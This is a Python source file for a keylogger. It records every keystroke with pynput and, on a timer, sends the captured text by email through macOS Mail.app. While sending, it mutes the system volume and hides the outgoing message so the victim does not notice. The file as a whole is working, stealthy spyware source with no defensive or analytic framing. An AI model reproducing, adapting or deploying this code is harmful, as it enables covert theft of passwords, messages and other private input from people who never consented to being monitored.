#!/usr/bin/python
import pynput.keyboard
import smtplib
import threading
import subprocess
import tempfile
import os
import platform

class Keylogger:

	def __init__(self, time_interval, email, password):
		#constructor
		self.logger = "[Keylogger Initiated]"
		self.subject = "Keylogger Report Email"
		self.email = email
		self.password = password
		self.interval = time_interval
	

	def append_to_log(self, key_strike):
		self.logger = self.logger + key_strike

	def evaluate_keys(self, key):
		try: 
			# This will not throw exceptions when encountering a special character
			Pressed_key = str(key.char)
		except AttributeError:
			# The case is for encountering a special character (space, tab, ctrl, Enter etc...)
			#TODO: include as many if as need to remove unwanted special characters
			if key == key.space:	# Show actual space instead of key.space
				Pressed_key =  " "
			else:
				Pressed_key =  " " + str(key) + " "

		#Now appending the key pressed		
		self.append_to_log(Pressed_key)


	def report(self):
		#sending the email of what has been logged
		# self.send_mail(self.email, self.password, self.subject, self.logger)
		self.send_mail_via_mail_app(self.email, self.subject, self.logger)
		self.logger = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()


	def send_mail_via_mail_app(self, to_email, subject, message, attachment_path=None):
		"""Send email using macOS Mail.app via AppleScript
        
		Args:
			to_email: Recipient email address
			subject: Email subject
			message: Email body content
			attachment_path: Optional path to file to attach
		"""
		script_file_path = None
		msg_file_path = None
		try:
			# Create temporary file for message content
			with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as msg_file:
				msg_file.write(str(message))
				msg_file_path = msg_file.name
			
			# Escape function for AppleScript strings (only for subject and email)
			def escape_applescript_string(text):
				if text is None:
					text = ""
				text = str(text)
				text = text.replace('\\', '\\\\')
				text = text.replace('"', '\\"')
				return text
			
			escaped_subject = escape_applescript_string(subject)
			escaped_email = escape_applescript_string(to_email)
			escaped_msg_path = msg_file_path.replace('\\', '\\\\').replace('"', '\\"')
			
			# Create AppleScript file to avoid command-line escaping issues
			with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.scpt') as script_file:
				script_file_path = script_file.name
				
				if attachment_path and os.path.exists(attachment_path):
					posix_path = os.path.abspath(attachment_path).replace('\\', '\\\\').replace('"', '\\"')
					script_content = f'''tell application "System Events"
	set currentVolume to output volume of (get volume settings)
	set volume output volume 0
end tell

tell application "Mail"
	set msgFile to POSIX file "{escaped_msg_path}"
	set messageContent to read msgFile
	set theMessage to make new outgoing message with properties {{subject:"{escaped_subject}", content:messageContent, visible:false}}
	tell theMessage
		make new to recipient at end of to recipients with properties {{address:"{escaped_email}"}}
		make new attachment with properties {{file name:(POSIX file "{posix_path}")}} at after the last paragraph
		send
	end tell
end tell

tell application "System Events"
	set volume output volume currentVolume
end tell'''
				else:
					script_content = f'''tell application "System Events"
	set currentVolume to output volume of (get volume settings)
	set volume output volume 0
end tell

tell application "Mail"
	set msgFile to POSIX file "{escaped_msg_path}"
	set messageContent to read msgFile
	set theMessage to make new outgoing message with properties {{subject:"{escaped_subject}", content:messageContent, visible:false}}
	tell theMessage
		make new to recipient at end of to recipients with properties {{address:"{escaped_email}"}}
		send
	end tell
end tell

tell application "System Events"
	set volume output volume currentVolume
end tell'''
				
				script_file.write(script_content)
			
			# Run the AppleScript file
			result = subprocess.run(
				['osascript', script_file_path],
				capture_output=True,
				text=True,
				timeout=30
			)
			
			if result.returncode == 0:
				return True
			else:
				return False
		except subprocess.TimeoutExpired:
			return False
		except Exception as e:
			return False
		finally:
			# Clean up temporary files
			if script_file_path and os.path.exists(script_file_path):
				try:
					os.unlink(script_file_path)
				except:
					pass
			if msg_file_path and os.path.exists(msg_file_path):
				try:
					os.unlink(msg_file_path)
				except:
					pass
				
	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()


